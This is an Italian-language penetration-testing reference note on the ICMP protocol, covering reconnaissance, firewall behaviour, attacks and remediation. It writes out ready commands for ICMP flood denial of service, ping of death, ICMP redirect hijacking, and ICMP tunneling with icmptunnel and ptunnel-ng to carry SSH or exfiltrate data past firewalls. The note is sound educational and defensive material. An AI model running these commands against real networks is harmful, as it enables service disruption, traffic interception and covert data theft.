---

Tipo: Protocollo di rete Livello OSI: 3 (Network) Rischio: 🟡 Medio (reconnaissance + tunneling) tags:

- protocollo
- icmp
- networking
- reconnaissance
- tunneling
- pivoting

---

# 📶 ICMP — Internet Control Message Protocol

> [!info] Nota ICMP non è un protocollo di trasferimento dati come TCP o UDP — è un protocollo di **diagnostica e controllo** della rete. Non ha porte. Nonostante la sua semplicità, è spesso abusato per reconnaissance, evasione di firewall e tunneling di traffico nascosto.

---

## 🧠 Cos'è

ICMP (Internet Control Message Protocol) è un protocollo di livello 3 (Network) usato dai dispositivi di rete per **comunicare errori e informazioni diagnostiche**. È parte integrante di IP e viene usato da tool fondamentali come `ping` e `traceroute`.

|Campo|Valore|
|---|---|
|**Livello OSI**|3 — Network|
|**Protocollo IP**|Numero 1|
|**Porte**|❌ Nessuna (non usa TCP/UDP)|
|**RFC**|RFC 792 (ICMPv4), RFC 4443 (ICMPv6)|
|**Versioni**|ICMPv4 (IPv4), ICMPv6 (IPv6)|

---

## 📨 Tipi di messaggi ICMP

I messaggi ICMP sono identificati da un campo **Type** e un campo **Code**:

|Type|Code|Nome|Descrizione|
|---|---|---|---|
|0|0|Echo Reply|Risposta al ping|
|3|0|Destination Unreachable|Network irraggiungibile|
|3|1|Destination Unreachable|Host irraggiungibile|
|3|3|Destination Unreachable|Porta irraggiungibile|
|5|0|Redirect|Reindirizza il traffico|
|8|0|Echo Request|Richiesta ping|
|11|0|Time Exceeded|TTL scaduto (usato da traceroute)|
|11|1|Time Exceeded|Fragment reassembly timeout|

> [!tip] Type 3 Code 3 `Destination Unreachable - Port Unreachable` viene generato da UDP quando si raggiunge un host ma la porta non è in ascolto. Nmap lo usa per rilevare porte UDP chiuse.

---

## 🔍 Uso in Reconnaissance

### Ping — host discovery

```bash
# Ping base
ping <IP>
ping -c 4 <IP>                  # solo 4 pacchetti
ping -c 1 -W 1 <IP>            # 1 pacchetto, timeout 1 secondo

# Ping sweep su una subnet (bash)
for i in $(seq 1 254); do
  ping -c 1 -W 1 192.168.1.$i &>/dev/null && echo "192.168.1.$i is up"
done

# Con nmap (più efficiente)
nmap -sn 192.168.1.0/24         # ping scan senza port scan
nmap -PE -sn 192.168.1.0/24    # solo ICMP echo
```

### Traceroute — mappatura del percorso

```bash
# Traceroute base (usa UDP di default su Linux)
traceroute <IP>

# Traceroute con ICMP (come Windows)
traceroute -I <IP>

# Con nmap
nmap --traceroute <IP>

# Windows
tracert <IP>
```

> [!tip] Come funziona traceroute Invia pacchetti con TTL crescente (1, 2, 3...). Ogni router che riceve un pacchetto con TTL=0 risponde con `ICMP Time Exceeded (Type 11)`, rivelando il suo indirizzo IP. Così si ricostruisce il percorso hop-by-hop.

### Nmap con ICMP

```bash
# Host discovery con ICMP echo
nmap -PE 192.168.1.0/24

# Host discovery con ICMP timestamp
nmap -PP 192.168.1.0/24

# Host discovery con ICMP netmask
nmap -PM 192.168.1.0/24

# Combina più metodi
nmap -PE -PP -PS22,80,443 -PA80 192.168.1.0/24
```

---

## 🧱 ICMP e Firewall

I firewall spesso filtrano ICMP in modo selettivo. Questo influenza la reconnaissance:

|Scenario|Comportamento|Interpretazione|
|---|---|---|
|Ping risponde|ICMP echo abilitato|Host up, ICMP non filtrato|
|Ping non risponde|ICMP filtrato o host down|Non conclusivo — host potrebbe essere up|
|`nmap -sn` non trova host|ICMP bloccato|Provare `-PS`, `-PA`, `-PU`|
|TTL decrescente in traceroute|Ogni hop funziona|Percorso visibile|
|`* * *` in traceroute|ICMP filtrato su quel hop|Router non risponde a Time Exceeded|

```bash
# Se ICMP è bloccato, provare host discovery alternativa
nmap -PS22,80,443 <IP>          # TCP SYN ping
nmap -PA80,443 <IP>             # TCP ACK ping
nmap -PU53 <IP>                 # UDP ping
nmap -Pn <IP>                   # no ping, assume host up
```

---

## 💥 Attacchi ICMP

### 1. ICMP Flood (DoS)

```bash
# Flood con ping (richiede root)
sudo ping -f <IP>               # flood mode — invia il più veloce possibile

# hping3 — più controllo
sudo hping3 --icmp --flood <IP>
```

### 2. Ping of Death

Invio di pacchetti ICMP frammentati che superano i 65.535 byte — causava crash su sistemi vecchi. Oggi tutti i sistemi moderni sono patchati.

```bash
# Solo per sistemi molto vecchi e non patchati
sudo hping3 --icmp -d 65500 <IP>
```

### 3. Smurf Attack

Invia un ping broadcast con IP sorgente falsificato (spoofato) con l'IP della vittima. Tutti gli host della rete rispondono alla vittima con ICMP Echo Reply, amplificando il traffico.

### 4. ICMP Redirect Attack

Invia un messaggio `ICMP Redirect (Type 5)` per modificare la routing table dell'host vittima e dirottare il traffico attraverso un host controllato dall'attaccante (MITM).

```bash
# Con hping3
sudo hping3 --icmp --icmptype 5 --icmpcode 1 <IP>
```

---

## 🕳️ ICMP Tunneling

ICMP può essere usato per incapsulare traffico arbitrario nei payload dei pacchetti ping — utile per **estrarre dati da reti con firewall restrittivi** che bloccano TCP/UDP ma permettono ICMP.

```
[Attaccante] ←─── dati nascosti in ICMP Echo ───→ [Vittima/Pivot]
```

### Tool per ICMP Tunneling

```bash
# icmptunnel
# Installa su entrambi i lati
git clone https://github.com/jamesbarlow/icmptunnel
cd icmptunnel && make

# Sul server (macchina che riceve)
sudo ./icmptunnel -s

# Sul client (macchina che si connette)
sudo ./icmptunnel <IP_server>

# ptunnel-ng — più stabile
sudo apt install ptunnel-ng

# Server
sudo ptunnel-ng

# Client — crea tunnel verso server, forward porta 2222 locale → SSH del target
sudo ptunnel-ng -p <IP_server> -lp 2222 -da <IP_target> -dp 22

# Poi connettiti via SSH attraverso il tunnel ICMP
ssh -p 2222 utente@127.0.0.1
```

> [!tip] Quando usare ICMP Tunneling In scenari di post-exploitation dove il firewall blocca tutto tranne ICMP (ping). Permette di mantenere una shell o estrarre dati anche in ambienti molto restrittivi. Utile anche in CTF con macchine che hanno reti interne isolate.

---

## 🔬 Analisi con Wireshark / tcpdump

```bash
# Cattura solo traffico ICMP
sudo tcpdump -i eth0 icmp

# Con più dettagli
sudo tcpdump -i eth0 icmp -v

# Wireshark — filtro
# icmp
# icmp.type == 8    → solo Echo Request
# icmp.type == 0    → solo Echo Reply
# icmp.type == 11   → solo Time Exceeded (traceroute)
```

---

## 📐 Struttura del pacchetto ICMP

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|     Type      |     Code      |          Checksum             |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|           Identifier          |        Sequence Number        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                             Data                              |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

- **Type** — categoria del messaggio
- **Code** — sottocategoria del messaggio
- **Checksum** — verifica integrità
- **Identifier** — usato per abbinare request/reply
- **Sequence Number** — numero progressivo (visibile nell'output di ping)
- **Data** — payload (nei tunnel ICMP, qui si nascondono i dati)

---

## 🛡️ Remediation (per il report)

- Bloccare ICMP in ingresso sui perimetri pubblici — specialmente echo request e redirect
- Permetti **selettivamente** solo i tipi necessari: `Type 3` (unreachable) e `Type 11` (time exceeded) sono utili per il troubleshooting
- Monitorare traffico ICMP anomalo (payload grandi, frequenze elevate) — possibile tunneling
- Disabilitare il processing di `ICMP Redirect` sugli host Linux: `sysctl -w net.ipv4.conf.all.accept_redirects=0`
- Usare IDS/IPS per rilevare ICMP flood e tunnel

---

## 🔗 Riferimenti

- [RFC 792 — ICMP](https://tools.ietf.org/html/rfc792)
- [HackTricks — ICMP](https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network/icmp-exfiltration)
- [ptunnel-ng — GitHub](https://github.com/utoni/ptunnel-ng)
- [[Tool/nmap|nmap]] — usa ICMP per host discovery
- [[Vulnerabilità/Tunneling|Data Exfiltration & Tunneling]]